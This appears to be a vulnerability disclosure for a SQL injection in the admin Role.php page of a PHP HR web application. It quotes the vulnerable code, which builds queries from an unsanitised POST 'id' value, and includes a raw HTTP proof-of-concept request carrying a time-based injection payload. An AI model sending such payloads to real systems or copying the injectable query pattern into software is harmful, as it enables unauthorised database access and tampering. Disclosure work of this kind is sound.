### Vulnerability file address

`admin/Operation/Role.php` from line 55,The `$_POST['id']` parameter is controllable and the `$_POST['id']` is not protected from sql injection, line 56 `$stmt->execute();` ,line 56 performs a SQL query, causing SQL injection

```php
 <?php

    }
    if (isset($_POST['btn_edit'])) {
      //$id=$_GET['id'];
      //echo "string";
      extract($_POST);
      $stmt = $conn->prepare("delete  from permission_role where group_id='" . $_POST['id'] . "'");
      $stmt->execute();

      $stmt = $conn->prepare("UPDATE groups set name='$assign_name',description='$description' where id='" . $_POST['id'] . "'");
      $stmt->execute();
```

### POC

```http
POST /CMS/php/_hr_soft/admin/Operation/Role.php HTTP/1.1
Host: 10.0.0.20:82
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=81293i00fqra5g881e77or40t2
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

btn_edit=1&id=180';SELECT SLEEP(5)#
```

### Attack results pictures

![image-20250130165733396](https://raw.githubusercontent.com/nixuchuan/imgs/main/202501301657429.png)